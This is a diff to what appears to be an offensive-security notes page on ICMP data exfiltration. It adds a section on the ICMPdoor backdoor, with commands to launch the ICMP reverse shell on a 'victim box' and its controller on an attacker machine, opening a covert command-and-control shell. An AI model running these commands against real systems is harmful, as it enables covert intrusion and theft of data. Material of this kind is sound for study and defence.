@@ -50,10 +50,18 @@ exit
 It acommplishes this by capturing the incoming ICMP packets and wait for Beginning of File trigger value then writes to disk until it recieves a End of File trigger value.
 
 
-## 
+## C2 ICMP Exfiltration
 
-[ICMPdoor](https://github.com/krabelize/icmpdoor)
 
+[ICMPdoor](https://github.com/krabelize/icmpdoor) is *"ICMP Reverse Shell written in Python 3 and with Scapy (backdoor/rev shell)"*. Similarly to the previous methods the C2 utilizes the Data section within the ICMP packet to exfiltrate data.
+
+```bash
+# Victim Box:
+sudo icmpdoor -i <interface> -d <destination-ip> &
+# Destination Box:
+sudo icmp-cnc -i <interface> -d <victim-ip>
+# This spawns a shell
+```
 
 
 ## References
